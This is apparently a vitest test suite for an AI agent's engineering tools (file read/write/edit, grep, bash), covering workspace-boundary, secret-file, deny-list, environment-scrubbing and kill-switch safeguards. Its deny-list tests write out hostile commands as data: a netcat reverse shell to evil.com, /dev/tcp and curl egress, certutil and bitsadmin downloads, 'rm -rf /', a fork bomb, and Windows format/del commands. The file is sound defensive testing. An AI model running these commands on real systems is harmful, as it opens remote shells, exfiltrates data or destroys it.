/**
 * M42 — native engineering tool surface (src/core/mcp-native-engineer.ts).
 *
 * Hermetic: every test runs under an isolated tmp HOME (h1-fixture) with
 * disposable git repos under os.tmpdir(); no real ~/.ashlr is ever touched,
 * no network, no live model. ASHLR_TEST_ALLOW_ANY_REPO=1 is set for the suite
 * so assertMayMutate's allowAnyRepo seam is honored against tmp worktrees.
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach } from 'vitest';
import { readFileSync, writeFileSync, symlinkSync, mkdtempSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

import { makeFixture, type H1Fixture, type DisposableRepo } from './helpers/h1-fixture.js';
import { canSymlink } from './helpers/platform.js';
import {
  type EngineerContext,
  callEngineerTool,
  assertCommandAllowed,
  clamp,
  minimalEnv,
  buildEngineerToolSpecs,
  buildNativeToolSpecsWithFn,
} from '../src/core/mcp-native-engineer.js';

let prevAllowAny: string | undefined;

beforeAll(() => {
  prevAllowAny = process.env.ASHLR_TEST_ALLOW_ANY_REPO;
  process.env.ASHLR_TEST_ALLOW_ANY_REPO = '1';
});

afterAll(() => {
  if (prevAllowAny === undefined) delete process.env.ASHLR_TEST_ALLOW_ANY_REPO;
  else process.env.ASHLR_TEST_ALLOW_ANY_REPO = prevAllowAny;
});

let fx: H1Fixture;
let repo: DisposableRepo;

/** A full-capability engineer context pinned to the disposable repo. */
function fullCtx(): EngineerContext {
  return {
    workspaceRoot: repo.dir,
    sourceRepo: repo.dir,
    allowWrite: true,
    allowExec: true,
  };
}

beforeEach(() => {
  expect.hasAssertions();
  fx = makeFixture();
  repo = fx.makeRepo({ files: { 'README.md': '# m42 test repo\n' } });
  repo.enroll();
});

afterEach(() => {
  fx.cleanup();
});

// ---------------------------------------------------------------------------
// clamp
// ---------------------------------------------------------------------------

describe('clamp', () => {
  it('clamps below, above, and passes through in-range; non-finite -> min', () => {
    expect(clamp(5, 1, 10)).toBe(5);
    expect(clamp(-3, 1, 10)).toBe(1);
    expect(clamp(99, 1, 10)).toBe(10);
    expect(clamp(NaN, 1, 10)).toBe(1);
  });
});

// ---------------------------------------------------------------------------
// resolveInside (the security spine) — exercised via tools
// ---------------------------------------------------------------------------

describe('workspace boundary (resolveInside)', () => {
  it('read_file refuses a "../escape" path', async () => {
    const out = await callEngineerTool('read_file', { path: '../escape' }, fullCtx());
    expect(out).toContain('path escapes workspace boundary');
  });

  it('read_file refuses an absolute path outside the workspace root', async () => {
    const out = await callEngineerTool('read_file', { path: '/etc/passwd' }, fullCtx());
    expect(out).toContain('path escapes workspace boundary');
  });

  it('write_file refuses escaping via .. segments', async () => {
    const out = await callEngineerTool(
      'write_file',
      { path: '../../evil.txt', content: 'x' },
      fullCtx(),
    );
    expect(out).toContain('path escapes workspace boundary');
  });

  // FIX 1 (CRITICAL): a symlinked intermediate directory pointing outside the
  // worktree must not let a not-yet-existing target escape. We canonicalize the
  // nearest existing ancestor (the symlink), so write/read/edit THROUGH it fail.
  // Skip on Windows without symlink privilege — symlinkSync throws EPERM there,
  // so the boundary-escape scenario cannot be staged (the source guard is still
  // exercised on POSIX/CI).
  describe.skipIf(!canSymlink())('symlinked-parent escape (canonicalize nearest existing ancestor)', () => {
    let outsideDir: string;

    beforeEach(() => {
      // A real directory OUTSIDE the worktree, with a victim file in it.
      outsideDir = mkdtempSync(join(tmpdir(), 'ashlr-m42-outside-'));
      writeFileSync(join(outsideDir, 'authorized_keys'), 'victim-secret\n', 'utf8');
      // A symlink INSIDE the worktree pointing at that outside dir.
      symlinkSync(outsideDir, join(repo.dir, 'evil'));
    });

    it('write_file through a symlinked parent THROWS escapes boundary', async () => {
      const out = await callEngineerTool(
        'write_file',
        { path: 'evil/pwned.txt', content: 'x' },
        fullCtx(),
      );
      expect(out).toContain('escapes workspace boundary');
    });

    it('read_file through a symlinked parent THROWS escapes boundary', async () => {
      const out = await callEngineerTool(
        'read_file',
        { path: 'evil/authorized_keys' },
        fullCtx(),
      );
      expect(out).toContain('escapes workspace boundary');
    });

    it('edit_file through a symlinked parent THROWS escapes boundary', async () => {
      const out = await callEngineerTool(
        'edit_file',
        { path: 'evil/authorized_keys', old_string: 'victim-secret', new_string: 'x' },
        fullCtx(),
      );
      expect(out).toContain('escapes workspace boundary');
    });
  });
});

// ---------------------------------------------------------------------------
// FIX 2: secret-file reads are refused (read_file) / skipped (grep)
// ---------------------------------------------------------------------------

describe('secret-file guard', () => {
  it('read_file refuses a .env file in the worktree', async () => {
    await callEngineerTool(
      'write_file',
      { path: '.env', content: 'API_KEY=sk_live_supersecretvalue123456\n' },
      fullCtx(),
    );
    const out = await callEngineerTool('read_file', { path: '.env' }, fullCtx());
    expect(out).toContain('looks like a secrets file');
    expect(out).not.toContain('supersecretvalue');
  });

  it('grep (JS scan) silently skips secret-named files', async () => {
    // The secret-skip lives in the JS-scan fallback (git grep is preferred when
    // the workspace is a git repo), so point the context at a NON-git tmp dir to
    // exercise the JS scan. The secret file's contents must never surface.
    const nonGit = mkdtempSync(join(tmpdir(), 'ashlr-m42-nongit-'));
    writeFileSync(join(nonGit, 'id_rsa'), 'NEEDLE_IN_SECRET=1\n', 'utf8');
    writeFileSync(join(nonGit, 'plain.ts'), 'const NEEDLE_IN_SECRET = 1;\n', 'utf8');
    const ctx: EngineerContext = {
      workspaceRoot: nonGit,
      sourceRepo: repo.dir,
      allowWrite: true,
      allowExec: true,
    };
    const out = await callEngineerTool('grep', { pattern: 'NEEDLE_IN_SECRET' }, ctx);
    // Found in plain.ts but NOT in the skipped secret file.
    expect(out).toContain('plain.ts:1:');
    expect(out).not.toContain('id_rsa:');
  });
});

// ---------------------------------------------------------------------------
// FIX 3: read_file size guard (refuse oversized files before loading)
// ---------------------------------------------------------------------------

describe('read_file size guard', () => {
  it('refuses a file larger than the read cap', async () => {
    // 1 MB + 1 byte of 'a' — just over MAX_READ_FILE_BYTES (1 MB).
    const big = 'a'.repeat(1024 * 1024 + 1);
    await callEngineerTool('write_file', { path: 'big.txt', content: big }, fullCtx());
    const out = await callEngineerTool('read_file', { path: 'big.txt' }, fullCtx());
    expect(out).toContain('read cap');
  });
});

// ---------------------------------------------------------------------------
// write_file / read_file / edit_file round-trips
// ---------------------------------------------------------------------------

describe('write_file + read_file + edit_file', () => {
  it('write_file then read_file round-trips inside the worktree', async () => {
    const w = await callEngineerTool(
      'write_file',
      { path: 'src/hello.ts', content: 'export const x = 1;\nexport const y = 2;\n' },
      fullCtx(),
    );
    expect(w).toContain('"written": true');
    // It really hit disk inside the worktree.
    expect(readFileSync(join(repo.dir, 'src/hello.ts'), 'utf8')).toContain('export const x = 1;');

    const r = await callEngineerTool('read_file', { path: 'src/hello.ts' }, fullCtx());
    expect(r).toContain('export const x = 1;');
    expect(r).toContain('export const y = 2;');
    // line-numbered (the rendered JSON encodes the tab as \t, so match the
    // line number followed by an escaped tab before the first line of content).
    expect(r).toMatch(/1\\texport const x = 1;/);
  });

  it('edit_file replaces an exact string', async () => {
    await callEngineerTool(
      'write_file',
      { path: 'note.txt', content: 'alpha beta gamma' },
      fullCtx(),
    );
    const e = await callEngineerTool(
      'edit_file',
      { path: 'note.txt', old_string: 'beta', new_string: 'BETA' },
      fullCtx(),
    );
    expect(e).toContain('"edited": true');
    expect(readFileSync(join(repo.dir, 'note.txt'), 'utf8')).toBe('alpha BETA gamma');
  });

  it('edit_file errors on 0 matches', async () => {
    await callEngineerTool('write_file', { path: 'a.txt', content: 'one two' }, fullCtx());
    const e = await callEngineerTool(
      'edit_file',
      { path: 'a.txt', old_string: 'missing', new_string: 'x' },
      fullCtx(),
    );
    expect(e).toContain('0 matches');
  });

  it('edit_file errors on ambiguous (>1) matches without replace_all', async () => {
    await callEngineerTool('write_file', { path: 'b.txt', content: 'dup dup dup' }, fullCtx());
    const e = await callEngineerTool(
      'edit_file',
      { path: 'b.txt', old_string: 'dup', new_string: 'x' },
      fullCtx(),
    );
    expect(e).toContain('ambiguous');
    // replace_all succeeds and replaces every occurrence.
    const ok = await callEngineerTool(
      'edit_file',
      { path: 'b.txt', old_string: 'dup', new_string: 'x', replace_all: true },
      fullCtx(),
    );
    expect(ok).toContain('"edited": true');
    expect(readFileSync(join(repo.dir, 'b.txt'), 'utf8')).toBe('x x x');
  });
});

// ---------------------------------------------------------------------------
// glob + grep
// ---------------------------------------------------------------------------

describe('glob + grep', () => {
  it('glob lists matching files scoped to the workspace', async () => {
    await callEngineerTool('write_file', { path: 'src/a.ts', content: '//a\n' }, fullCtx());
    await callEngineerTool('write_file', { path: 'src/b.ts', content: '//b\n' }, fullCtx());
    await callEngineerTool('write_file', { path: 'docs/c.md', content: '#c\n' }, fullCtx());

    const g = await callEngineerTool('glob', { pattern: 'src/**/*.ts' }, fullCtx());
    expect(g).toContain('src/a.ts');
    expect(g).toContain('src/b.ts');
    expect(g).not.toContain('docs/c.md');
  });

  it('grep finds a matching line (git grep or JS scan)', async () => {
    await callEngineerTool(
      'write_file',
      { path: 'src/needle.ts', content: 'const HAYSTACK = 1;\nconst NEEDLE = 2;\n' },
      fullCtx(),
    );
    // commit so git grep (tracked-files only) sees it; JS scan works regardless.
    const g = await callEngineerTool('grep', { pattern: 'NEEDLE' }, fullCtx());
    expect(g).toContain('NEEDLE');
  });
});

// ---------------------------------------------------------------------------
// capability gating
// ---------------------------------------------------------------------------

describe('capability gating', () => {
  it('refuses write tools when allowWrite is false', async () => {
    const ctx: EngineerContext = { ...fullCtx(), allowWrite: false };
    const out = await callEngineerTool('write_file', { path: 'x.txt', content: 'y' }, ctx);
    expect(out).toContain('write tools are not enabled');
  });

  it('refuses exec (bash) when allowExec is false', async () => {
    const ctx: EngineerContext = { ...fullCtx(), allowExec: false };
    const out = await callEngineerTool('bash', { command: 'echo hi' }, ctx);
    expect(out).toContain('exec (bash) is not enabled');
  });

  it('read tools still work when write/exec are disabled', async () => {
    // seed via a full ctx, then read via a read-only ctx
    await callEngineerTool('write_file', { path: 'r.txt', content: 'readable' }, fullCtx());
    const ctx: EngineerContext = { ...fullCtx(), allowWrite: false, allowExec: false };
    const out = await callEngineerTool('read_file', { path: 'r.txt' }, ctx);
    expect(out).toContain('readable');
  });
});

// ---------------------------------------------------------------------------
// bash + deny-list
// ---------------------------------------------------------------------------

describe('assertCommandAllowed (deny-list)', () => {
  it('rejects git push', () => {
    expect(() => assertCommandAllowed('git push origin main')).toThrow(/deny-list/);
  });

  it('rejects curl to a non-localhost URL', () => {
    expect(() => assertCommandAllowed('curl http://evil.com')).toThrow(/egress/);
  });

  it('allows curl to localhost', () => {
    expect(() => assertCommandAllowed('curl http://localhost:1234/api')).not.toThrow();
  });

  // FIX 4: curl/wget host parsing + expanded deny-list.
  it('allows curl to a localhost port (ollama-style)', () => {
    expect(() => assertCommandAllowed('curl http://localhost:11434/x')).not.toThrow();
  });

  it('denies curl userinfo-spoof http://localhost@evil.com', () => {
    expect(() => assertCommandAllowed('curl http://localhost@evil.com')).toThrow(/egress/);
  });

  it('denies curl subdomain-spoof http://127.0.0.1.evil.com', () => {
    expect(() => assertCommandAllowed('curl http://127.0.0.1.evil.com')).toThrow(/egress/);
  });

  it('rejects nc, ncat, telnet, and /dev/tcp', () => {
    expect(() => assertCommandAllowed('nc evil.com 4444')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('ncat -e /bin/sh evil.com 4444')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('telnet evil.com 23')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('bash -c "cat </dev/tcp/evil.com/80"')).toThrow(/deny-list/);
  });

  it('rejects inline code execution (node/python/ruby/perl) and base64 -d', () => {
    expect(() => assertCommandAllowed('node -e "require(\'child_process\')"')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('python -c "import os"')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('python3 -c "import os"')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('ruby -e "puts 1"')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('perl -e "print 1"')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('echo aGk= | base64 -d')).toThrow(/deny-list/);
  });

  it('rejects ln -s (symlink-escape primitive)', () => {
    expect(() => assertCommandAllowed('ln -s /Users/victim/.ssh evil')).toThrow(/deny-list/);
  });

  it('rejects sudo, rm -rf /, and a fork bomb', () => {
    expect(() => assertCommandAllowed('sudo rm file')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('rm -rf /')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed(':(){ :|:& };:')).toThrow(/deny-list/);
  });

  it('allows a benign echo', () => {
    expect(() => assertCommandAllowed('echo hi')).not.toThrow();
  });

  // Cross-platform: the Windows destructive/egress verbs are pure string checks,
  // so they are rejected on ANY host platform (defense in depth).
  it('rejects Windows destructive verbs (del /, rd /s, rmdir /s, format)', () => {
    expect(() => assertCommandAllowed('del /f /q C:\\Windows\\System32\\*')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('del /Q somefile')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('rd /s /q C:\\data')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('rmdir /s /q C:\\data')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('format C: /q')).toThrow(/deny-list/);
  });

  it('rejects PowerShell Remove-Item -Recurse / -Force', () => {
    expect(() => assertCommandAllowed('Remove-Item -Recurse -Force C:\\data')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('Remove-Item C:\\data -Force')).toThrow(/deny-list/);
  });

  it('rejects PowerShell / Windows network egress verbs', () => {
    expect(() => assertCommandAllowed('Invoke-WebRequest https://evil.com -OutFile x')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('iwr https://evil.com')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('Invoke-RestMethod https://evil.com')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('bitsadmin /transfer job https://evil.com/x C:\\x')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('certutil -urlcache -f https://evil.com/x x.exe')).toThrow(/deny-list/);
  });

  it('routes curl.exe / wget.exe through the localhost egress check', () => {
    expect(() => assertCommandAllowed('curl.exe http://evil.com')).toThrow(/egress/);
    expect(() => assertCommandAllowed('wget.exe http://evil.com')).toThrow(/egress/);
    expect(() => assertCommandAllowed('curl.exe http://localhost:11434/x')).not.toThrow();
  });

  it('rejects powershell -enc / -EncodedCommand (obfuscated execution)', () => {
    expect(() => assertCommandAllowed('powershell -enc ZQBjAGgAbwA=')).toThrow(/deny-list/);
    expect(() => assertCommandAllowed('powershell -EncodedCommand ZQBjAGgAbwA=')).toThrow(/deny-list/);
  });
});

// ---------------------------------------------------------------------------
// minimalEnv — cross-platform, never leaks secrets
// ---------------------------------------------------------------------------

describe('minimalEnv', () => {
  it('carries no *_API_KEY / *_SECRET / *_TOKEN keys on this platform', () => {
    // Plant secret-shaped vars in the parent env; minimalEnv must not surface them.
    const planted = {
      ANTHROPIC_API_KEY: 'sk-ant-shouldnotleak-0000000000000000',
      SOME_SECRET: 'shhhh',
      GITHUB_TOKEN: 'ghp_shouldnotleak0000000000000000000000',
    };
    const prev: Record<string, string | undefined> = {};
    for (const [k, v] of Object.entries(planted)) {
      prev[k] = process.env[k];
      process.env[k] = v;
    }
    try {
      const env = minimalEnv();
      for (const key of Object.keys(env)) {
        expect(key).not.toMatch(/_API_KEY$|_SECRET$|_TOKEN$/i);
      }
      // And none of the planted values are present.
      for (const v of Object.values(planted)) {
        expect(Object.values(env)).not.toContain(v);
      }
    } finally {
      for (const [k, v] of Object.entries(prev)) {
        if (v === undefined) delete process.env[k];
        else process.env[k] = v;
      }
    }
  });

  it('always provides PATH and a scratch home dir', () => {
    const env = minimalEnv();
    expect(typeof env.PATH).toBe('string');
    // posix: HOME; win32: USERPROFILE — at least one points at a scratch dir.
    const home = env.HOME ?? env.USERPROFILE;
    expect(typeof home).toBe('string');
    expect((home as string).length).toBeGreaterThan(0);
  });
});

describe('bash (runBash)', () => {
  it('runs `echo hi` -> stdout "hi", exitCode 0', async () => {
    const out = await callEngineerTool('bash', { command: 'echo hi' }, fullCtx());
    expect(out).toContain('"exitCode": 0');
    expect(out).toContain('hi');
  });

  it('refuses a deny-listed command without spawning', async () => {
    const out = await callEngineerTool('bash', { command: 'git push' }, fullCtx());
    expect(out).toContain('deny-list');
  });

  it('scrubs secret-shaped output ([REDACTED])', async () => {
    // A bare Stripe-style secret key the scrubber must redact in the result.
    const out = await callEngineerTool(
      'bash',
      { command: 'echo sk_live_ABCDEFGHIJKLMNOP1234567890' },
      fullCtx(),
    );
    expect(out).toContain('[REDACTED]');
    expect(out).not.toContain('sk_live_ABCDEFGHIJKLMNOP1234567890');
  });

  // POSIX-only: relies on `${VAR}` expansion semantics, which differ on cmd.exe.
  // The platform-agnostic guarantee (no secrets in the env at all) is asserted
  // directly against minimalEnv() in the "minimalEnv" describe block below.
  it.skipIf(process.platform === 'win32')('does not leak the parent ANTHROPIC_API_KEY into the shell env', async () => {
    const prev = process.env.ANTHROPIC_API_KEY;
    process.env.ANTHROPIC_API_KEY = 'sk-ant-shouldnotleak-0000000000000000';
    try {
      const out = await callEngineerTool(
        'bash',
        { command: 'echo "key=[${ANTHROPIC_API_KEY}]"' },
        fullCtx(),
      );
      // The var is undefined in the minimal env, so it expands to empty.
      expect(out).toContain('key=[]');
      expect(out).not.toContain('shouldnotleak');
    } finally {
      if (prev === undefined) delete process.env.ANTHROPIC_API_KEY;
      else process.env.ANTHROPIC_API_KEY = prev;
    }
  });
});

// ---------------------------------------------------------------------------
// kill switch
// ---------------------------------------------------------------------------

describe('kill switch', () => {
  it('refuses write/exec but still allows read when KILL is engaged', async () => {
    await callEngineerTool('write_file', { path: 'k.txt', content: 'pre-kill' }, fullCtx());
    fx.setKill(true);
    try {
      const w = await callEngineerTool('write_file', { path: 'k2.txt', content: 'x' }, fullCtx());
      expect(w).toContain('kill switch is engaged');
      const b = await callEngineerTool('bash', { command: 'echo hi' }, fullCtx());
      expect(b).toContain('kill switch is engaged');
      // read still works
      const r = await callEngineerTool('read_file', { path: 'k.txt' }, fullCtx());
      expect(r).toContain('pre-kill');
    } finally {
      fx.setKill(false);
    }
  });
});

// ---------------------------------------------------------------------------
// spec builders
// ---------------------------------------------------------------------------

describe('buildEngineerToolSpecs', () => {
  it('filters by allowWrite / allowExec', () => {
    const readOnly = buildEngineerToolSpecs({
      workspaceRoot: repo.dir,
      sourceRepo: repo.dir,
      allowWrite: false,
      allowExec: false,
    });
    const names = readOnly.map((s) => s.name).sort();
    expect(names).toEqual(['glob', 'grep', 'read_file']);

    const full = buildEngineerToolSpecs(fullCtx());
    const fullNames = full.map((s) => s.name).sort();
    expect(fullNames).toEqual(['bash', 'edit_file', 'glob', 'grep', 'read_file', 'write_file']);

    // Each spec exposes a callable fn (the agent-loop contract).
    for (const s of full) {
      expect(typeof s.fn).toBe('function');
      expect(s.type).toBe('function');
      expect(s.function.name).toBe(s.name);
    }
  });

  it('a built spec fn executes through the gated pipeline', async () => {
    const specs = buildEngineerToolSpecs(fullCtx());
    const write = specs.find((s) => s.name === 'write_file')!;
    const res = await write.fn({ path: 'viaspec.txt', content: 'spec-wrote-me' });
    expect(res).toContain('"written": true');
    expect(readFileSync(join(repo.dir, 'viaspec.txt'), 'utf8')).toBe('spec-wrote-me');
  });
});

describe('buildNativeToolSpecsWithFn', () => {
  it('returns 11 specs each with a callable fn', () => {
    const specs = buildNativeToolSpecsWithFn();
    expect(specs).toHaveLength(11);
    for (const s of specs) {
      expect(typeof s.fn).toBe('function');
      expect(s.type).toBe('function');
      expect(typeof s.function.name).toBe('string');
      expect(s.function.name).toBe(s.name);
    }
  });

  it('a native spec fn is executable in-process and returns text', async () => {
    const specs = buildNativeToolSpecsWithFn();
    const orient = specs.find((s) => s.name === 'ashlr_orient')!;
    const out = await orient.fn({});
    // ashlr_orient returns an OrientResult JSON; just assert non-empty text.
    expect(typeof out).toBe('string');
    expect(out.length).toBeGreaterThan(0);
  });
});
